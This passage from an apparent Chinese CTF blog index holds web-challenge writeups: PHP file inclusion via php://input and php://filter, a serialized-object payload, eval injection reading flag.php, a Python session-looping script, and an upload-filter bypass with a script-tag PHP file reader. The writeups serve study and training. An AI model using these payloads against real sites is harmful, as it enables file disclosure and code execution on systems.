<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到<code>file_get_contents()</code>函数推测可能存在文件包含(参看LFI（Local File Include）漏洞学习)，利用姿势如下:</p>
<ul>
<li>利用<code>php://inpu</code>t和POST发包<code>admin</code>绕过<code>filegetcontents($user,&#39;r&#39;)===&quot;admin&quot;)</code>。</li>
</ul>
<ul>
<li>利用<code>php://filter/read=convert.base64-encode/resource=class.php</code>来读取class.php。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?user=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</span></span><br></pre></td></tr></table></figure>


<p>得到回显:</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">hello admin!</span><br><span class="line">PD9waHANCmVycm9yX3JlcG9ydGluZyhFX0FMTCAmIH5FX05PVElDRSk7DQogDQpjbGFzcyBSZWFkey8vZjFhOS5waHANCiAgICBwdWJsaWMgJGZpbGU7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsNCiAgICAgICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmZpbGUpOyAgICANCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIl9fdG9TdHJpbmcgd2FzIGNhbGxlZCEiOw0KICAgIH0NCn0NCj8+</span><br></pre></td></tr></table></figure>

<p>Base64解密得到class.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;										<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">			&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        	&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意到 <code>__toString()</code>函数执行时会读取并打印 <code>$this-&gt;file</code>的内容，构造序列化脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line">$payload = <span class="keyword">new</span> Read();</span><br><span class="line">$payload-&gt;file = <span class="string">'f1a9.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($payload);</span><br><span class="line"><span class="comment">//O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>赋值给<code>pass</code>当作为字符串是将调用<code>__toString()</code>读取f1a9.php的内容，Payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?user=php:<span class="comment">//input&amp;file=class.php&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br></pre></td></tr></table></figure>

<p>请求包：</p>
<pre><code>POST /index.php?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;} HTTP/1.1
Host: 123.206.31.85:10021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://123.206.31.85:10021
Connection: close
Referer: http://123.206.31.85:10021/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;}
Cookie: PHPSESSID=273219g1daais8g64fpuuik6t5j0r4br
Upgrade-Insecure-Requests: 1

admin</code></pre><p>在返回包的网页查看源码即可见到：</p>
<pre><code>flag{db2699f21f433a78}</code></pre>]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋writeup</title>
    <url>/2019/11/30/i%E6%98%A5%E7%A7%8B_writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>i春秋 ctf大本营_web writeup</p>
<a id="more"></a>

<h1 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h1><p>给了一段PHP代码，里面还有简单的正则表达式，那就来分析一下.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>/表示的是正则表达式的开始和结束，^或\A 匹配字符串开始位置，\w匹配任意数字或字母或下划线(a-z,A-Z,0-9,_)，*匹配0次、或1次、或多次其前面的字符(相当于可以输入多个字符、数字、或下划线)，$或者\Z匹配字符串的结束位置。所以在这里我们输入hello可以执行</p>
<p>提示有说flag在某个变量中，还观察到var_dump($$a)，可以使用超全局变量$GLOBALS，直接在url中构造?hello=GLOBALS即可flag。</p>
<pre><code>?hello=GLOBALS</code></pre><p>做题小结：这道题之所以能够用超全局变量，就是因为输出时又多了一个$,利用它构造一系列超全局变量,得出我们想要的信息。</p>
<pre><code>$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息
$_REQUEST 用于收集 HTML 表单提交的数据
$_POST 广泛用于收集提交 method=&quot;post&quot; 的 HTML 表单后的表单数据。
$_GET 也可用于收集提交 HTML 表单 (method=&quot;get&quot;) 之后的表单数据</code></pre><h1 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h1><p>提示说flag不在变量中，用$GLOBALS查看果然不在。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>不在变量中，那就查flag.php文件，查到一个file_get_contents() 函数可以把整个文件读入一个字符串中。</p>
<pre><code>/?hello=file_get_contents(&apos;flag.php&apos;)</code></pre><p>做题小结:可以利用三种不同的函数，都可以得出flag</p>
<pre><code>file() 函数是把整个文件读入一个数组中，然后将文件作为一个数组返回。
readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 &apos;@&apos; 来隐藏错误输出。
file_get_contents() 把整个文件读入一个字符串中。</code></pre><h1 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破_3"></a>爆破_3</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line">session_start();	<span class="comment">//开启session</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);	<span class="comment">//引入flag文件</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();<span class="comment">//time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();<span class="comment">//session_destroy() 将重置 session，您将失去所有已存储的 session 数据</span></span><br><span class="line">&#125;</span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];<span class="comment">//$_REQUEST 用于收集 HTML 表单提交的数据</span></span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];<span class="comment">//mt_rand() 使用 Mersenne Twister 算法返回随机整数</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==</span><br><span class="line">($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;<span class="comment">//a . b 	并置 	连接两个字符串 	"Hi" . "Ha" 	HiHa</span></span><br><span class="line">$_SESSION[<span class="string">'nums'</span>]++;<span class="comment">//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 	0。</span></span><br><span class="line">$_SESSION[<span class="string">'whoami'</span>] = $str_rands;<span class="comment">//subst	(string,start,length)</span></span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>前两个if语句简单，重要的是如下语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br></pre></td></tr></table></figure>

<p>$str_rand会从a到z中随机取一个字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]会拼凑成两个字母赋值给$str_rands。<br>然后就来观察以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==</span><br><span class="line">($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;<span class="comment">//a . b 	并置 	连接两个字符串 	"Hi" . "Ha" 	HiHa</span></span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;<span class="comment">//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;<span class="comment">//substr(string,start,length)</span></span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明了了，因为$_SESSION[‘nums’] = 0，我们只需将上面的if语句循环十次（即$_SESSION[‘nums’]++循环十次），即可得出flag。<br>接下来就来构造语句，一开始的$_SESSION[‘whoami’] = ‘ea’，因此就构造</p>
<pre><code>?value[0]=e&amp;value[1]=a</code></pre><p>又因为每执行一次，$_SESSION[‘whoami’]会变化而且值与$str_rands相同，并且每执行一次都会输出$str_rands的值，因此只要按照这个顺序输入十次即可得出flag。<br>可以写一个脚本来跑出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://8e7202f5492447d5ab76eb8b7e8b4b27838e55901eba4c5f.changame.ichunqiu.com'</span></span><br><span class="line"><span class="comment"># 创建一个session对象  </span></span><br><span class="line">session=requests.Session()</span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">html=session.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+ html[<span class="number">0</span>:<span class="number">2</span>]).text</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>

<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>可以上传任意文件，并且上传之后可以打开文件（源码有链接/u/xx.php），想到上传一段php代码来打开flag.php页面:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>

<p>但是发现&lt;?php被过滤了，使用script绕过和大小写绕过：</p>
<pre><code>&lt;script language=&quot;PHP&quot;&gt;
$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&apos;r&apos;);
echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;))); 
fclose($fh);
&lt;/script&gt;</code></pre><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'here_is_flag'</span>;</span><br><span class="line"><span class="string">'flag&#123;05b17e33-2b22-4619-a245-b71c7ef2b1f8&#125;'</span>;</span><br></pre></td></tr></table></figure>

<p>PHP读取文件内容的五种方式：<br>第一种</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">	$str = fread($fp,filesize($file_path));<span class="comment">//指定读取大小，这里把整个文件内容读取出来</span></span><br><span class="line">	<span class="keyword">echo</span></span><br><span class="line">	$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第二种</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$str = file_get_contents($file_path);<span class="comment">//将整个文件内容读入到一个字符串中</span></span><br><span class="line">	$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">	<span class="keyword">echo</span></span><br><span class="line">	$str;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第三种</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">	$str = <span class="string">""</span>;</span><br><span class="line">	$buffer = <span class="number">1024</span>;<span class="comment">//每次读取 1024 字节</span></span><br><span class="line">	<span class="keyword">while</span>(!feof($fp))&#123;<span class="comment">//循环读取，直至读取完整个文件</span></span><br><span class="line">	$str.= fread($fp,$buffer);</span><br><span class="line">	&#125;</span><br><span class="line">	$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">	<span class="keyword">echo</span></span><br><span class="line">	$str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第四种</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$file_arr = file($file_path);</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($file_arr);$i++)&#123;<span class="comment">//逐行读取文件内容</span></span><br><span class="line">		<span class="keyword">echo</span></span><br><span class="line">		$file_arr[$i].<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">foreach($file_arr as $value)&#123;</span></span><br><span class="line"><span class="comment">echo $value."&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第五种</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">	$str = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">while</span>(!feof($fp))&#123;</span><br><span class="line">		$str.= fgets($fp);<span class="comment">//逐行读取。如果fgets不写length参数，默认是读取1k。</span></span><br><span class="line">	&#125;</span><br><span class="line">	$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">	<span class="keyword">echo</span></span><br><span class="line">	$str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
</search>
